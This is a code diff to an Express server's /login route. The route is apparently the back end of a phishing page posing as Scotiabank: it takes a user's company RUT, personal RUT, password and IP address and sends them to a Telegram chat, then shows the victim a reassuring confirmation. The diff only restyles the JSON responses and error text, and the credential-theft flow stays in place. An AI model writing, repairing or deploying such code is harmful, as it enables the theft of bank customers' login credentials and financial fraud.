@@ -35,13 +35,18 @@ app.post("/login", async (req, res) => {
   const mensaje = `🔔Login Scotiab:\n🏢 RUT Empresa: ${rutEmpresa || "(sin empresa)"}\n👤 RUT Persona: ${rutPersona || "(sin persona)"}\n🔑 Clave: ${passwd || "(sin clave)"}\n🌐 IP: ${ip}`;
 
   try {
-    await sendTelegramMessage(mensaje);
-    res.json({ Estado de ingreso: "✅ Hemos recibido tu solicitud." });
-  } catch (error) {
-    console.error("Error enviando a Telegram:", error);
-    res.status(500).json({  mensaje: "❌ Error al notificar." });
-  }
-});
+  await sendTelegramMessage(mensaje);
+  res.json({ 
+    status: "Conectado", 
+    mensaje: "Hemos recibido tu solicitud." 
+  });
+} catch (error) {
+  console.error("Error enviado:", error);
+  res.status(500).json({ 
+    status: "Error", 
+    mensaje: "Error al notificar." 
+  });
+}
 
 // Servir index.html por defecto
 app.get("/", (req, res) => {
